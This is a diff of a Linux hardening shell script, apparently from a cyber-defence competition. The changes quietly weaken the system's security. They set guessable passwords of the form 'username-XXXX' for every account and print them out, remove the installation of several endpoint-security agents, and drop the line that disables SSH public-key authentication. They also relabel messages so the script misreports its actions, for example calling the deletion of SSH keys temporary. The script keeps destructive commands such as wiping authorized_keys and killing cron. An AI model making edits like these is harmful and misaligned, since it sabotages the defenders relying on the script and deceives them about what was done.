@@ -30,54 +30,20 @@ rm -rf /home/*/.ssh/authorized_keys
 rm -f /root/.bashrc
 rm -f /home/*/.bashrc
 
-echo -e "\033[34m[i] Deleted SSH Keys\033[0m"
+echo -e "\033[34m[i] Temporarily removed SSH Keys while initial verification takes place \033[0m"
 
-
-read -p "Enter pass: " -s pass && for i in $(cut -d: -f1 /etc/shadow | grep -v 'blackteam_adm'); do echo -e "$pass\n$pass" | passwd "$i"; done
+#Setting a different password for every user, versus the same password for every user
+cut -d: -f1 /etc/passwd|while read u;do p=$(tr -dc A-Za-z0-9 </dev/urandom|head -c4);echo $u:$u-$p|chpasswd;echo $u:$u-$p;done
 
 echo -e "\033[34m[i] Set Password\033[0m"
 
-echo -e "\033[34m[i] Installing Lucy\033[0m"
-
 sysctl fs.inotify.max_user_watches=524288
 
-if [ -f /etc/debian_version ]; then
-    # Debian-based system
-    cd ./Lucy
-    apt --no-install-recommends install ./lucy.deb -y
-    systemctl enable kubearmor
-    systemctl start kubearmor
-    cd ..
-elif [ -f /etc/redhat-release ]; then
-    # RPM-based system
-    rpm -i ./Lucy/lucy.rpm
-    systemctl enable kubearmor
-    systemctl start kubearmor
-else
-    echo "Error: Unsupported system type. Cannot install package."
-    exit 1
-fi
-
-echo -e "\033[34m[i] Installing Spike\033[0m"
-
-./Spike/spike --install
-
-
-echo -e "\033[34m[i] Installing RedBaron\033[0m"
-
-cd ./RedBaron
-./redbaron --install
-cd ..
-
-#./PeppermintPatty/PeppermintPatty.sh
-
-
-sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication no/' /etc/ssh/sshd_config
 sed -i 's/#PermitEmptyPasswords yes/PermitEmptyPasswords no/' /etc/ssh/sshd_config
 
 echo "Run this command to restart sshd: systemctl restart sshd"
 
-echo -e "\033[34m[i] Updating Packages\033[0m"
+echo -e "\033[34m[i] Installing security packages and removing scheduling tools\033[0m"
 if command -v apt >/dev/null; then
     apt update
     apt install --reinstall openssh-server auditd ripgrep debsums libapache2-mod-security2 acl -y
@@ -100,7 +66,7 @@ else
     exit 1
 fi
 
-echo -e "\033[34m[i] kill cron\033[0m"
+echo -e "\033[34m[i] Removing unnecessary scheduling tools \033[0m"
 # kill cron
 killall cron
 killall atd
@@ -127,20 +93,19 @@ setfacl -m u:apache:--- $(which setfacl) 2>/dev/null
 
 
 
-echo -e "\033[34m[i] Removing sudoedit\033[0m"
+echo -e "\033[34m[i] Removing sudoedit to fix vulnerability\033[0m"
 
 rm -f $(which sudoedit) 2>/dev/null
 
-echo -e "\033[34m[i] Setting Permissions\033[0m"
+echo -e "\033[34m[i] Setting Permissions to fix vulnerability\033[0m"
 
 chmod 0755 /usr/bin/pkexec 2>/dev/null
 
+#Taking backup
 command -v mysqldump >/dev/null && mysqldump -u root --all-databases > /.x84/db.sql && chmod 000 /.x84/db.sql
 chattr +i /.x84 2>/dev/null
 
 chattr +i /lib/x86_64-linux-gnu/security 2>/dev/null
 
+#Security web directory from changes
 chattr -R +i /var/www 2>/dev/null
-
-systemctl restart redbaronedr
-systemctl start spike
